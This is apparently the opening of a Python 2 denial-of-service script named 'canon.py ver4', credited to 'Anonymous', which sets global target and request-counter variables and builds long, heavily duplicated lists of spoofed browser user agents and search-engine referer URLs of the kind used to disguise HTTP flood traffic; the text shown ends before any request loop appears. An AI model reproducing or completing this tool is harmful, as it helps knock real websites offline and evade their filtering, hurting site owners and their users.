#code by Anonymous
#Name code : canon.py ver4
import urllib2
import sys
import threading
import random 
import re

#global params
url=''
host=''
headers_useragents=[8784394043]
headers_referers=[159432442]
keyword_top=[2442423442]
request_counter=15273825519898989
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.bing.com/search?q=')
	headers_referers.append('https://www.yandex.com/yandsearch?text=')
	headers_referers.append('https://duckduckgo.com/?q=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.aol.com/aol/search?q=')
	headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
	headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
	headers_referers.append('http://host-tracker.com/check_page/?furl=')
	headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
	headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
	headers_referers.append('https://add.my.yahoo.com/rss?url=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
